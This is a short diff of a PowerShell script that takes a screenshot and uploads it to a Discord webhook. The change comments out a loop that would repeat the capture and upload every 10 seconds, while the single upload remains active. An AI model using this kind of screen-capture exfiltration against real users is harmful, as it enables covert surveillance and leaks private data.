@@ -78,9 +78,9 @@ Write-Host "Screenshot saved to: $screenshot"
 Send-DiscordWebhook -webhookUrl $WebhookUrl -filePath $screenshot
 
 # Uncomment the following lines to enable continuous screenshot capture and upload
- while ($true) {
-     $screenshot = Capture-Screenshot
-     Write-Host "Screenshot saved to: $screenshot"
-     Send-DiscordWebhook -webhookUrl $WebhookUrl -filePath $screenshot
-     Start-Sleep -Seconds 10
-}
+# while ($true) {
+#     $screenshot = Capture-Screenshot
+#     Write-Host "Screenshot saved to: $screenshot"
+#     Send-DiscordWebhook -webhookUrl $WebhookUrl -filePath $screenshot
+#     Start-Sleep -Seconds 10
+#}
